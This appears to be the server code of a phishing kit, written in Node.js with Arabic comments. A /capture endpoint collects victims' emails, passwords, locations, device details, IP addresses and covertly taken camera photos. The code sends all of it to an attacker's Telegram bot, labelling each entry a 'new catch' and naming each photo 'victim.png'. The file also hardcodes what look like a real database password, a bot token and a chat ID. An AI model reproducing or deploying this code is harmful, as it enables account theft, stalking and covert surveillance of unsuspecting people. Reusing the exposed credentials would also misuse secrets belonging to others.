const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express(); // تعريف المتغير الذي يسبب الخطأ حالياً

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); // لدعم إرسال الصور الكبيرة

// إعدادات الربط الخاصة بك
const MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/myDatabase?retryWrites=true&w=majority";
const BOT_TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk";
const CHAT_ID = "8351043975";

mongoose.connect(MONGO_URI).then(() => console.log("✅ Database Connected")).catch(err => console.error(err));

// عرض صفحة الدخول (PWA)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// استقبال البيانات (إيميل، باسورد، موقع، وصورة)
app.post('/capture', async (req, res) => {
    try {
        const { email, password, location, image, device } = req.body;
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        const mapUrl = location ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "الموقع مرفوض";
        const message = `🔥 صيد جديد (PWA)!\n📧 إيميل: ${email}\n🔑 باسورد: ${password}\n📍 خريطة: ${mapUrl}\n📱 جهاز: ${device}\n🌐 IP: ${ip}`;

        // إرسال البيانات النصية للتيليجرام
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: message });

        // إرسال الصورة إذا التقطها الكود
        if (image && image.includes("base64")) {
            const buffer = Buffer.from(image.split(",")[1], 'base64');
            const { FormData } = require('form-data');
            const form = new FormData();
            form.append('photo', buffer, { filename: 'victim.png' });
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, form, { headers: form.getHeaders() });
        }

        res.status(200).send("Success");
    } catch (e) {
        console.error(e);
        res.status(500).send("Error");
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
